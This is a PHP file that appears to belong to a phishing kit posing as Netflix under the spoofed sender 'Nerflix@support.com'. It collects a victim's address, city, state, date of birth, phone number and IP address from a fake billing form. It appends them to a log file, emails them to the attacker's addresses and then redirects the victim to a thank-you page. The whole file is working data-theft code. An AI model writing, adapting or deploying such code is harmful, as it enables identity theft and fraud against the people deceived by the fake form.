<?php

session_start();
include '../anti.php';
include '../vg.php';
include '../truelogin.php';



$adr = $_SESSION['adr'] = $_POST['adr'];
$s = $_SESSION['state'] = $_POST['state'];
$c = $_SESSION['city'] = $_POST['city'];
$bd = $_SESSION['bd'] = $_POST['bd'];
$bm = $_SESSION['bm']= $_POST['bm'];
$by = $_SESSION['by'] = $_POST['by'];
$ph = $_SESSION['phone'] = $_POST['phone'];
$iP_adress = $_SERVER['REMOTE_ADDR'];


$vg = "
|==================Card Info====================|
|BOD              : $bd / $bm / $by
|ADRESS           : $adr
|STATE            : $s
|CITY             : $c
|PHONE            : $ph
|IP Adresse       : https://geoiptool.com/?ip=$iP_adress
|===============================================|";


$txt = fopen('../../r/r.txt', 'a');
fwrite($txt, $vg);
fclose($txt);

$subject = "Billing [$iP_adress]";
$headers = 'From: Nerflix@support.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
mail($to, $subject, $vg, $headers);
mail($tox, $subject, $vg, $headers);

header("location:../thank_you");




?>